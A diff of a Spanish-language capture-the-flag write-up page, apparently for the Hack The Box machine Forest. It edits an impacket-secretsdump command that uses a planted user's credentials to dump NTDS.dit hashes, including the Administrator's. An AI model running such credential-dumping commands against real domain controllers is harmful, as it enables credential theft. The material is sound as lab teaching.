@@ -388,7 +388,7 @@ PS C:\Users\svc-alfresco\Documents></span>
 
 <p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">secretsdump</code> con las credenciales del usuario <code class="language-plaintext highlighter-rouge">pwned</code> podemos dumpear todos los <code class="language-plaintext highlighter-rouge">hashes</code> del <code class="language-plaintext highlighter-rouge">ntds.dit</code> entre ellos el hash del usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-secretsdump </span><span class="p">WORKGROUP/pwned:pwned123@10.10.10.161
+<code><span class="ve">❯ impacket-secretsdump </span><span class="p">htb.local/pwned:pwned123@10.10.10.161
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
